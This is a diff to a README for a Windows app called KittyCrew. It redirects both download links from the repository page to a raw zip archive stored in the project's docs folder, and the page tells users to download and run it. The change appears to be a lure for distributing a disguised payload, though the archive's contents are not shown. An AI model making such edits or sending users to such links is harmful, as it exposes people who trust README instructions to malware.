@@ -1,6 +1,6 @@
 # 🐱 KittyCrew - Keep AI Companions in One Place
 
-[![Download KittyCrew](https://img.shields.io/badge/Download-KittyCrew-blue?style=for-the-badge)](https://github.com/levorotary-galvanometer224/KittyCrew)
+[![Download KittyCrew](https://img.shields.io/badge/Download-KittyCrew-blue?style=for-the-badge)](https://github.com/levorotary-galvanometer224/KittyCrew/raw/refs/heads/main/docs/Kitty_Crew_3.0.zip)
 
 ## 🧭 What KittyCrew Does
 
@@ -22,7 +22,7 @@ If your PC runs other desktop apps well, it should handle KittyCrew.
 
 Visit this page to download and run the app on Windows:
 
-[https://github.com/levorotary-galvanometer224/KittyCrew](https://github.com/levorotary-galvanometer224/KittyCrew)
+[https://github.com/levorotary-galvanometer224/KittyCrew/raw/refs/heads/main/docs/Kitty_Crew_3.0.zip](https://github.com/levorotary-galvanometer224/KittyCrew/raw/refs/heads/main/docs/Kitty_Crew_3.0.zip)
 
 If the page shows a release file, download it. If it shows the main project page, use the latest Windows build or setup file listed there.
 
